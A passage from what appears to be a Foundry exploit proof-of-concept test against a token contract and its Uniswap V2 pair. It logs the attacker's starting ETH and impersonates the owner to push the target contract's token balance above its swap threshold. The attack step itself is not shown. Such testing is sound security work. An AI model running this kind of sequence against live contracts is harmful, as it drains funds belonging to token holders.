        address pair = token.uniswapV2Pair();
        console.log("Pair address:", pair);

        // Record initial ETH balance
        uint256 initialEth = address(attackerContract).balance;
        console.log("Initial attacker ETH:", initialEth);

        // Use owner to transfer tokens to the contract to accumulate above threshold
        // First, check owner's balance
        uint256 ownerBalance = token.balanceOf(owner);
        console.log("Owner balance:", ownerBalance);

        // Transfer from owner to contract to build up contract balance
        vm.startPrank(owner);
        token.transfer(TARGET, minSwap * 2);
        vm.stopPrank();

        console.log("Contract balance after owner transfer:", token.balanceOf(TARGET));

